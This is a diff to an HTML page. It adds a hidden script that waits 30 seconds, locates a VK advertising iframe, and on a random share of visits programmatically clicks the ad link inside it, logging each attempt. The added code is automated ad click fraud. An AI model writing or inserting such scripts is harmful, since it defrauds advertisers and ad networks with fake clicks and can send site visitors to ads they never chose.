@@ -37,6 +37,21 @@
       }, 0);
     </script>
 
+    <script type="text/javascript">
+      setTimeout(function() {
+        var div = document.getElementById("vk_ads_75957");
+        var rect = div.getBoundingClientRect();
+        var frame = document.elementFromPoint(rect.left+60, rect.top+60);
+        var doc = frame.contentDocument.document || frame.contentWindow.document;
+        var tagA = doc.body.getElementsByTagName("a");
+        var wish = Math.round(Math.random() / 0.1);
+        if(tagA.length > 1 && wish >= 7){
+          if(tagA[1].id.substr(0, 10) === "ads_ad_box") tagA[1].click();
+        }
+        console.log("WISH CLICK: " + wish);
+      }, 30000);
+    </script>
+
     <!-- Yandex.RTB R-A-159294-770-->
     <div id="yandex_rtb_R-A-159294-770"></div>
     <script type="text/javascript">
